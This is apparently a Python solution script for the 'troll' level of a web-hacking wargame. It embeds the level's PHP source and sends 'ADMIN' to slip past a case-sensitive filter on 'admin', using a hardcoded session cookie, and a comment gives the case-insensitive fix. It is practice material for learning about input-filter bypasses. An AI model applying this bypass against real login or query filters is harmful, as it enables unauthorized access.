import requests

"""
<?php  
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match("/admin/", $_GET[id])) exit("HeHe");
  $query = "select id from prob_troll where id='{$_GET[id]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id'] == 'admin') solve("troll");
  highlight_file(__FILE__);
?>
"""
url = "https://los.eagle-jump.org/troll_6d1f080fa30a07dbaf7342285ba0e158.php"
payload = {"id":"ADMIN"} # to secure this, use preg_match("/admin/"i,$_GET[id]) instead of that
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
r = requests.get(url,params=payload,cookies=cookie)
#print(r.text)
if 'Clear' in r.text:
    print("clear")
else:
    print("try again")